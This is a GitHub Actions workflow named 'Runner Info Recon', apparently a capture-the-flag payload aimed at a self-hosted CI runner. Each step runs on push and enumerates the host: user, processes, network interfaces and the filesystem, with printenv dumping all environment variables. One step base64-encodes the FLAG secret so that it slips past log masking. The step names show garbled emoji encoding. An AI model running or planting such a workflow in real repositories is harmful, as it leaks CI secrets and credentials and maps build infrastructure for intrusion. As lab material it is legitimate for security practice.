name: Runner Info Recon

on:
  push:
    branches:
      - main
  workflow_dispatch:

jobs:
  enum:
    name: Environment Enumeration
    runs-on: self-hosted
    steps:
      - name: "CTF FLAG"
        run: echo $FLAG | base64
        
      - name: ğŸ–¥ï¸ OS Info
        run: uname -a

      - name: ğŸ‘¤ Whoami
        run: whoami

      - name: ğŸ” Environment Variables
        run: printenv

      - name: ğŸ“‚ Filesystem Check
        run: ls -la /

      - name: ğŸ”— Network Interfaces
        run: |
          which ip && ip a || ifconfig

      - name: ğŸ› ï¸ Running Processes
        run: ps aux
